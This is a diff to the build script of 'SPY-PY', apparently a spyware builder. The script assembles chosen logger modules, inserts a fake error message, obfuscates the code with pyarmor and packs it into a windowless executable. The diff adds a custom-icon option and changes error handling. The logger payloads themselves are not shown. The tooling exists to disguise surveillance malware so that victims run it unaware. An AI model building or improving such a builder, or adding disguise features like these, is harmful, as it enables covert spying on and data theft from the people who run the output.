@@ -5,7 +5,6 @@
 #                                                                   #
 #!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!#
 
-# TODO Add icon option for the executable
 import os
 import re
 import requests
@@ -57,8 +56,10 @@ def assemble_source(selected_loggers):
                     imports.add(line.strip())
                 else:
                     utils_content += line
-    except UnicodeDecodeError as e:
-        print(f"[SPY-PY BUILDER] [INFO] UnicodeDecodeError in 'src/utils.py': {e}")
+    except Exception as e:
+        print(
+            f"[SPY-PY BUILDER] [INFO] An error occurred while reading 'src/utils.py': {e}"
+        )
         ERROR_OCCURRED = True
         return
 
@@ -76,9 +77,9 @@ def assemble_source(selected_loggers):
                                     imports.add(line.strip())
                             else:
                                 loggers_content += line
-                except UnicodeDecodeError as e:
+                except Exception as e:
                     print(
-                        f"[SPY-PY BUILDER] [INFO] UnicodeDecodeError in '{os.path.join(root, file)}': {e}"
+                        f"[SPY-PY BUILDER] [INFO] An error occurred while reading '{os.path.join(root, file)}': {e}"
                     )
                     ERROR_OCCURRED = True
                     continue
@@ -96,8 +97,10 @@ def assemble_source(selected_loggers):
                         imports.add(line.strip())
                 else:
                     main_content += line
-    except UnicodeDecodeError as e:
-        print(f"[SPY-PY BUILDER] [INFO] UnicodeDecodeError in 'src/main.py': {e}")
+    except Exception as e:
+        print(
+            f"[SPY-PY BUILDER] [INFO] An error occurred while reading 'src/main.py': {e}"
+        )
         ERROR_OCCURRED = True
         return
 
@@ -110,9 +113,9 @@ def assemble_source(selected_loggers):
             f.write(loggers_content)
             f.write("\n")
             f.write(main_content)
-    except UnicodeEncodeError as e:
+    except Exception as e:
         print(
-            f"[SPY-PY BUILDER] [INFO] UnicodeEncodeError when writing to 'spy-py-temp/assembled.py': {e}"
+            f"[SPY-PY BUILDER] [INFO] An error occurred while writing to 'spy-py-temp/assembled.py': {e}"
         )
         ERROR_OCCURRED = True
         return
@@ -160,7 +163,22 @@ def prepare_source():
             custom_error_message = input(
                 "[SPY-PY BUILDER] Enter the custom error message: "
             ).strip()
-
+        choice = (
+            input(
+                "[SPY-PY BUILDER] Would you like to include an icon for the executable? (yes/no): "
+            )
+            .strip()
+            .lower()
+        )
+        if choice == "yes":
+            if not os.path.exists("icon"):
+                os.makedirs("icon")
+            icon_name = input(
+                "[SPY-PY BUILDER] Place the icon file in the 'icon' directory and enter the name of the icon file (including extension):"
+            ).strip()
+            icon_command = f"--i icon/{icon_name}"
+        else:
+            icon_command = ""
         with open("spy-py-temp/assembled.py", "r", encoding="utf-8") as f:
             content = f.readlines()
 
@@ -192,7 +210,7 @@ def prepare_source():
 
         os.remove("spy-py-temp/assembled.py")
         print("[SPY-PY BUILDER] [INFO] Source preparation completed successfully.")
-        return exe_name
+        return [exe_name, icon_command]
     except Exception as e:
         print(
             f"[SPY-PY BUILDER] [ERROR] An error occurred while preparing the source: {e}"
@@ -202,7 +220,7 @@ def prepare_source():
         return
 
 
-def pack_source(exe_name):
+def pack_source(exe_name, icon_command):
     global ERROR_OCCURRED
     try:
         os.rename("spy-py-temp/prepared.py", f"spy-py-temp/{exe_name}.py")
@@ -210,7 +228,7 @@ def pack_source(exe_name):
         venv_activate_command = "Spy-Py\\Scripts\\activate"
 
         commands = [
-            f'{venv_activate_command} && pyarmor cfg pack:pyi_options=" -w"',
+            f'{venv_activate_command} && pyarmor cfg pack:pyi_options=" -w {icon_command}"',
             f"{venv_activate_command} && pyarmor gen --pack onefile spy-py-temp/{exe_name}.py",
         ]
 
@@ -230,6 +248,7 @@ def cleanup(exe_name):
     global ERROR_OCCURRED
     try:
         shutil.rmtree("spy-py-temp", ignore_errors=True)
+        shutil.rmtree("icon", ignore_errors=True)
         if os.path.exists(".pyarmor"):
             shutil.rmtree(".pyarmor", ignore_errors=True)
         if os.path.exists("Spy-Py"):
@@ -255,23 +274,21 @@ def finish():
         )
     else:
         print(
-            "[SPY-PY BUILDER] [INFO] The build process has been completed with some errors."
+            "[SPY-PY BUILDER] [ERROR] The build process has encountered errors. Please review the error messages above and try again."
         )
-        print("[SPY-PY BUILDER] [INFO] Please check the errors and try again.")
-
-
-def main():
-    print("[SPY-PY BUILDER] Welcome to the SpyPy Builder!")
-    selected_loggers = select_loggers()
-    assemble_source(selected_loggers)
-    if not ERROR_OCCURRED:
-        exe_name = prepare_source()
-        if not ERROR_OCCURRED:
-            pack_source(exe_name)
-            if not ERROR_OCCURRED:
-                cleanup(exe_name)
-                finish()
+        print(
+            "[SPY-PY BUILDER] [ERROR] If the issue persists, please open an issue on GitHub."
+        )
 
 
 if __name__ == "__main__":
-    main()
+    print("[SPY-PY BUILDER] [INFO] Starting build process...")
+    selected_loggers = select_loggers()
+    assemble_source(selected_loggers)
+    if not ERROR_OCCURRED:
+        exe_name, icon_command = prepare_source()
+    if not ERROR_OCCURRED:
+        pack_source(exe_name, icon_command)
+    if not ERROR_OCCURRED:
+        cleanup(exe_name)
+    finish()
